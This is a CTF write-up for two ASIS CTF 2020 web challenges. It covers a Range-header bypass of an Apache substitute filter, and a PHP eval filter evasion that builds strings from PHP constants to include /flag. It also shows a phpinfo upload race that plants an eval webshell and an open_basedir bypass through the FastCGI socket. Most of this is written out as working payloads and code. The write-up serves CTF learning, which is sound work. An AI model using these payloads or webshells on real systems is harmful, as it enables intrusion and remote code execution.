# ASIS CTF 2020 - Less secure secrets + More secure secrets
## Source code

[App source](configs.zip)

# ASIS CTF 2020 - Less secure secrets

[](img/less-secure-secrets.png)

The challenge is built with 3 dockers containers:

- Apache Proxy

```
    RequestHeader unset Accept-Encoding
    ProxyPass / http://main/
    ProxyPassReverse / http://main/

    SetEnvIf X-Http-Method-Override ".+" X-Http-Method-Override=$0
    RequestHeader set X-Http-Method-Override %{X-Http-Method-Override}e env=X-Http-Method-Override

    SetEnvIf Range ".+" Range=$0
    RequestHeader set Range %{Range}e env=Range

    SetEnvIf Via ".+" Via=$0
    RequestHeader set Via %{Via}e env=Via

    SetEnvIf If-Match ".+" If-Match=$0
    RequestHeader set If-Match %{If-Match}e env=If-Match

    <if "%{REMOTE_ADDR} != '127.0.0.1'">
        AddOutputFilterByType INFLATE;SUBSTITUTE;DEFLATE text/html
        Substitute s|<secret>(.*)</secret>|Protected|i
    </if>
```

- Apache Main

```
    DocumentRoot /var/www/html/
    <Directory /var/www/html/>
        DirectoryIndex index.php
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
        <FilesMatch \.php$>
            SetHandler proxy:fcgi://php:9000/
        </FilesMatch>
    </Directory>
```

- PHP FastCGI

```
...
open_basedir = /var/www/html:/tmp/
file_uploads = On
upload_tmp_dir = /tmp/uploads/
allow_url_include = Off
...
```

The secret file is in `secret.html` but if we try to read, we get the message "Protected".

The response headers give us a clue: `accept-ranges: bytes`

When we use the `Range: bytes=0-` header, the `substitute_module` is not applied and the flag is returned.

```
<secret>What??? You want the first secret? I think it's "ASIS{L3T5_S74rT_7h3_fUn}".</secret>
```

# More secure secrets

Can you obtain the more secure secret? Even with all those filters? I don't think so :) [https://securesecrets.asisctf.com/Y0U\_CANT\_GUESS\_THIS\_5TUPLFGSGZYWXOKHINMBDWCKAGERCQJV.php](https://securesecrets.asisctf.com/Y0U_CANT_GUESS_THIS_5TUPLFGSGZYWXOKHINMBDWCKAGERCQJV.php)

```php
<html><head></head>
<body>
<img width="300px" src="/img.jpg" style="display:block;">

<?php
function no_errors_baby($ab){
    die("I don't like errors and warnings");
}
function no_race($item, $key){}
    
array_walk_recursive($_SERVER, 'no_race');
array_walk_recursive($_GET, 'no_race');
array_walk_recursive($_POST, 'no_race');
array_walk_recursive($_REQUEST, 'no_race');
set_error_handler ( "no_errors_baby" , E_ALL );

if(!isset($_GET["yummy"])){
    highlight_file(__FILE__);
} else {
    sleep(2); //Anti-race
    echo "<!--";
    phpinfo(); 
    echo "-->";
    if(preg_match('/\$|\?|`|\'|"|%|!|[0-9]|@|\(|\)|\^|&|\*|-|\+|=|<|>|\\|{|}|\/|\||true|false|null|secret/i', $_GET["yummy"]) || strlen($_GET["yummy"]) > 5000)
        die("Don't try harder");
    eval($_GET["yummy"]);
}
?>
</body>
</html>
```
We control the content of `eval`, but the filter does not allow us to use most special characters, we cannot use variables because the `$` character is not allowed, we cannot call functions because we cannot use parenthesis, also, we cannot use numbers.

Instead, we can use `echo` since the use of parentheses is not mandatory. Now we need something to show.

In PHP, if we enter a text without quotes that is not defined as a constant, it is converted to a string, but returns a Warning. In this case if we generate a warning, the execution is terminated with the message `I don't like errors and warnings`, so we cannot use this approach.

Since we cannot generate text, we are going to use the constants already defined in PHP. To get a list we use `get_defined_constants()` in our local docker.

```
    [E_ERROR] => 1
    [E_RECOVERABLE_ERROR] => 4096
    [E_WARNING] => 2
    [E_PARSE] => 4
    [E_NOTICE] => 8
    ...
    [PHP_PREFIX] => /usr
    [PHP_BINDIR] => /usr/bin
    [PHP_MANDIR] => /usr/share/man
    [PHP_LIBDIR] => /usr/lib/php
    [PHP_DATADIR] => /usr/share/php/7.3
    [PHP_SYSCONFDIR] => /etc
```

Once we have the list of constants, we obtain their values against the remote server using `echo CONSTANT`.

The next step is to get characters using the form `CONST_TEXT[CONST_NUMBER]`. For example, if we know that the constant `PHP_OS` is `Linux` and `PHP_ZTS` is `0`, we use `PHP_OS[PHP_ZTS]` to get `L`.

To speed up the replacement work I made a small *Python* script.

```python
letters = {
    '0': 'PHP_ZTS',
    '1': 'E_ERROR',
    '2': 'E_WARNING',
    '3': 'ZLIB_RLE',
    '4': 'E_PARSE',
    '5': 'ZLIB_BLOCK',
    '6': 'INPUT_SESSION',
    '7': 'UPLOAD_ERR_CANT_WRITE',
    '8': 'E_NOTICE',
    'L': 'PHP_OS[PHP_ZTS]',
    'S': 'OPENSSL_VERSION_TEXT[E_PARSE]',
    'O': 'OPENSSL_VERSION_TEXT[PHP_ZTS]',
    'a': 'PHP_LIBDIR[E_NOTICE]',
    'b': 'PHP_LIBDIR[ZLIB_BUF_ERROR]',
    'c': 'PHP_SAPI[ZLIB_BLOCK]',
	...
    's': 'PHP_LIBDIR[E_WARNING]',
    't': 'PHP_SYSCONFDIR[POSIX_RLIMIT_MSGQUEUE]',
    'u': 'PHP_OS[ZLIB_RLE]',
    'v': 'PHP_LOCALSTATEDIR[ZLIB_DATA_ERROR]',
    'w': 'ICONV_IMPL[ZLIB_BLOCK]',
    'x': 'PHP_OS[E_PARSE]',
    'y': '',
    'z': 'PHP_EXTENSION_DIR[CURLOPT_NOBODY]'
}

if(len(sys.argv)>1):
    arr = []
    for c in sys.argv[1]:
        arr.append(letters[c])
    print('.'.join(arr))
```

Finally, we only have to use `include` to open the `/flag` file.

```
include PHP_LIBDIR[PHP_ZTS].PHP_SAPI[PHP_ZTS].PHP_LIBDIR[ZLIB_BLOCK].PHP_LIBDIR[E_NOTICE].PHP_SAPI[INPUT_SESSION];
```

`ASIS{PHP_c0n574n75_4r3_S0_u53fU1l}`


# Shell upload
Although during the challenge this restriction was not in place, at the time of writing the writeup some additional steps had to be taken to get the flag.

The first step is to upload a shell. To do this we take advantage of the `phpinfo()` of the page itself to know the name of a temporary upload. As this file is deleted at the end of the PHP script execution, we need to read it and execute it before this happens.

To do this, we generate an infinite loop with `x:goto x;`. The maximum execution time is set to 6 seconds, so we need to automate this process. To do this we need to use the Python `socket` library and process the partial response from the web server looking for `/tmp/uploads/phpXXXXXXXXXX`.

Once the path is obtained, we use again the constants to form the path, and we use `include` to execute it. 
If any character in the path cannot be converted, the process is repeated.

```
['/tmp/uploads/phpMIDfbl']
PHP_LIBDIR[PHP_ZTS].PHP_SYSCONFDIR[POSIX_RLIMIT_MSGQUEUE].PHP_SAPI[E_WARNING].PHP_SAPI[E_ERROR].PHP_LIBDIR[PHP_ZTS].PHP_OS[ZLIB_RLE].PHP_SAPI[E_ERROR].PHP_LIBDIR[ZLIB_BLOCK].PHP_LIBDIR[INPUT_SESSION].PHP_LIBDIR[E_NOTICE].PHP_CONFIG_FILE_SCAN_DIR[ZLIB_ERRNO].PHP_LIBDIR[E_WARNING].PHP_LIBDIR[PHP_ZTS].PHP_SAPI[E_ERROR].PHP_LIBDIR[ZLIB_STREAM_ERROR].PHP_SAPI[E_ERROR].OPENSSL_DEFAULT_STREAM_CIPHERS[E_ERROR.IMAGETYPE_JPC].OPENSSL_DEFAULT_STREAM_CIPHERS[ZLIB_BLOCK.E_PARSE.E_WARNING].OPENSSL_DEFAULT_STREAM_CIPHERS[E_WARNING].PHP_SAPI[PHP_ZTS].PHP_LIBDIR[ZLIB_BUF_ERROR].PHP_LIBDIR[ZLIB_BLOCK]
```

Another limitation of the challenge is that we have blocked many file creation functions, however we can use `move_uploaded_file` to move the temporary file.

In this way, we first upload a file with `move_uploaded_file`, and then execute it while uploading a webshell.
```
<?php move_uploaded_file($_FILES['file']['tmp_name'] , '/tmp/uploads/patata.php');
```

```
<?php
  restore_error_handler();
  error_reporting(E_ALL);
  eval($_REQUEST['cmd']);
?>
```

# open_basedir bypass

We use the following code to call the PHP FastCGI socket, we pass the code by POST to the webshell using `Content-Type: multipart/form-data;`.

<https://github.com/w181496/FuckFastcgi/blob/master/index.php>

```php
$client = new FCGIClient('127.0.0.1', 9000);

$params = array(       
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'REQUEST_METHOD'    => 'GET',
        'SCRIPT_FILENAME'   => '/tmp/uploads/p/t.php',
        'PHP_VALUE'         => 'open_basedir = /',
		'PHP_ADMIN_VALUE'   => 'disable_functions = ""'
        );

echo $client->request($params, NULL);
```

Previously we have uploaded the following code, which will be the one to be executed without restrictions.

```php
echo @file_get_contents('/flag');
```

Finally, if everything went right, we obtain the flag `ASIS{PHP_c0n574n75_4r3_S0_u53fU1l}`


# Remaining characters
Although the file name `Y0U_CANT_GUESS_THIS_THIS_5TUPLFGSGZYWXOKHINMBDWCKAGERCQJV.php` had quite a few of the characters we were missing to complete the alphabet and appears to have been done on purpose to help solve the test, it was not possible to use `__FILE__[0]` and no suitable alternative was found to obtain these characters.
